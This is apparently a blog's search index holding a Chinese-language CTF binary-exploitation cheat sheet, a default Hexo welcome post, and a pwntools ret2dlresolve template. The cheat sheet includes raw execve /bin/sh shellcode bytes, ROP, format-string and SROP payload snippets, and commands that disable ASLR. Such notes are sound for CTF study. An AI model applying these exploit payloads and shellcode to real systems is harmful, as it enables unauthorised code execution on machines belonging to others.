<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn</title>
      <link href="/posts/51111.html"/>
      <url>/posts/51111.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwn更换目标libc"><a href="#pwn更换目标libc" class="headerlink" title="pwn更换目标libc"></a>pwn更换目标libc</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 .&#x2F;pwnpatchelf --set-interpreter ld的硬路径 .&#x2F;pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="标题指定"><a href="#标题指定" class="headerlink" title="标题指定"></a>标题指定</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context(arch&#x3D;&quot;i386&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ROPgedget"><a href="#ROPgedget" class="headerlink" title="ROPgedget"></a>ROPgedget</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;查找可存储寄存器的代码 ROPgadget --binary rop --string &quot;&#x2F;bin&#x2F;sh&quot;查找字符串ROPgadget --binary rop  --only &#39;int&#39;查找有int 0x80的地址写rop也可以用ROPgadgetROPgadget --binary .&#x2F;rop --ropchainfrom struct import pack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc_write&#x3D;libc.symbols[&quot;write&quot;]system_addr&#x3D;base_addr+libc.symbols[&quot;system&quot;]bin_sh&#x3D;base_addr+libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo sh -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;即可关闭ASLRsudo sh -c &quot;echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot; 开启ASLR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">任意地址写直接使用pwntools的fmtstr_payload函数如：需要在0xffffdafc该地址上写入数据0x5201314fmtstr_payload(7,&#123;0xffffdafc:0x5201314&#125;)前提是需要先确定好字符串的偏移量，这上面为7fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;&#39;byte&#39;)第一个参数表示格式化字符串的偏移；第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；本题是将0804a048处改为0x2223322第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。fmtstr_payload函数返回的就是payload格式化字符串偏移量查找：fmtarg 0xffffff修改多个地址的值：payload&#x3D;fmtstr_payload(6,&#123;atoi_got:system_plt+6,system_got:main&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pwntools生成64位shellcode语句：shellcode&#x3D;asm(shellcraft.amd64.sh(),arch&#x3D;&#39;amd64&#39;)shellcode&#x3D;asm(shellcraft.sh())32位shellcode：&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;64位shellcode：&#39;\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05&#39;&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;shellcrft生成orw的shellcode：code &#x3D; shellcraft.open(&quot;&#x2F;flag&quot;)code +&#x3D; shellcraft.read(3,target_addr,0x50)code +&#x3D; shellcraft.write(1, target_addr, 0x50)shellcode&#x3D;asm(code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SROP模板"><a href="#SROP模板" class="headerlink" title="SROP模板"></a>SROP模板</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">sigframe &#x3D; SigreturnFrame()sigframe.rax &#x3D; constants.SYS_execvesigframe.rdi &#x3D; stack_addr + 0x120  # &quot;&#x2F;bin&#x2F;sh&quot; &#39;s addrsigframe.rsi &#x3D; 0x0sigframe.rdx &#x3D; 0x0sigframe.rsp &#x3D; stack_addrsigframe.rip &#x3D; syscall_retread &#x3D; SigreturnFrame()read.rax &#x3D; constants.SYS_readread.rdi &#x3D; 0read.rsi &#x3D; stack_addrread.rdx &#x3D; 0x400read.rsp &#x3D; stack_addrread.rip &#x3D; syscall_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><pre class="line-numbers language-none"><code class="language-none">int绕过判断条件，输入2147483648，返回0x80000000http:&#x2F;&#x2F;www.binaryconvert.com&#x2F;convert_double.html可用于查询小数的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">seccomp-tools dump .&#x2F;file分析程序的seccomp状态，哪些被系统被禁用了安装<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="多线程查看"><a href="#多线程查看" class="headerlink" title="多线程查看"></a>多线程查看</h2><pre class="line-numbers language-none"><code class="language-none">gdb 中使用 &#39;fsbase&#39; 指令即可获得 fs 寄存器的值，&#39;info threads&#39; 可以查看当前的线程，&#39;thread i&#39; 可以切换到第 i 个线程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Sha256爆破-proof-of-work"><a href="#Sha256爆破-proof-of-work" class="headerlink" title="Sha256爆破 proof of work"></a>Sha256爆破 proof of work</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *import reimport itertoolsimport stringimport codecsfrom hashlib import sha256from pwn import remote, contextfrom os import urandomimport itertoolsimport datetime#r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;note&quot;)r&#x3D;remote(&quot;chuj.top&quot;,51513)def PoW(hash_value, part):    alphabet &#x3D; string.ascii_letters + string.digits    for x in itertools.product(alphabet, repeat&#x3D;4):        nonce &#x3D; &#39;&#39;.join(x)        if sha256((nonce + part).encode()).hexdigest() &#x3D;&#x3D; hash_value:            return nonceelf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;note&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;libc-2.31.so&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]r.recvuntil(&quot;&#x3D;&#x3D;&#x3D;\n&quot;)line &#x3D; r.recvuntil(b&#39;\n&#39;)print(line)re_res &#x3D; re.search(r&#39;\) &#x3D;&#x3D; ([0-9a-z]&#123;64&#125;)&#39;, line.decode())print(re_res)# part &#x3D; re_res.group(1)# print(part)hash_value &#x3D; re_res.group(1)print(hash_value)nonce &#x3D; PoW(hash_value, &#39;&#39;)print(nonce)r.sendline(nonce.encode())print(&#39;PoW finish.&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="find-fake-fast"><a href="#find-fake-fast" class="headerlink" title="find_fake_fast"></a>find_fake_fast</h2><pre class="line-numbers language-none"><code class="language-none">Fastbin attack在申请堆块时会对chunk的size域进行检查，因此在申请时，需要对size域的检查进行绕过。将堆块申请到malloc_hook附近，从而修改malloc_hook的内容，可以使用pwndbg自带的命令：find_fake_fast 0x7ffff7dd1b10 0x700x7ffff7dd1b10为main_arena的地址或想要修改的内容0x70为想要申请的fake_chunk的size，一般为0x70Print (viod *)&amp;main_arena为打印main_arena的地址Print (void *)&amp;__malloc_hook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="E:\笔记\笔记图片\find_fake_fast.png"></p>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/16107.html"/>
      <url>/posts/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new &quot;My New Post&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 说明 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwntools构造ret2dlresolve模板</title>
      <link href="/posts/1010.html"/>
      <url>/posts/1010.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwntools构造ret2dlresolve模板"><a href="#pwntools构造ret2dlresolve模板" class="headerlink" title="pwntools构造ret2dlresolve模板"></a>pwntools构造ret2dlresolve模板</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:class Ret2dlresolvePayload(__builtin__.object) |  Methods defined here: |   |  __init__(self, elf, symbol, args, data_addr&#x3D;None) |   |  ---------------------------------------------------------------------- |  Data descriptors defined here: |   |  __dict__ |      dictionary for instance variables (if defined) |   |  __weakref__ |      list of weak references to the object (if defined)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>elf：相应的文件</p><p>symbol：函数名称</p><p>args：函数参数</p><p>data_addr：该payload所在的地址(默认会会放在bss比较高的地址上)</p><p>常用方法（用之前要设置context.binary和elf）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dlresolve &#x3D; Ret2dlresolvePayload(elf,symbol&#x3D;&quot;system&quot;,args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;],data_addr&#x3D;0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>print(rop.dump())可以查看rop链内容</p><p>以上来自TTYflag师傅的介绍</p><p>在使用前先指定</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop&#x3D;ROP(&quot;.&#x2F;pwn&quot;)#pwntools模板dlresolve &#x3D; Ret2dlresolvePayload(elf, symbol&#x3D;&quot;system&quot;, args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;])rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)info(rop.dump()) #查看rop信息payload&#x3D;fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;)#0x4c是写入rop链的地方，0x100是read读入的大小。#fit就是填充一下r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/1.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
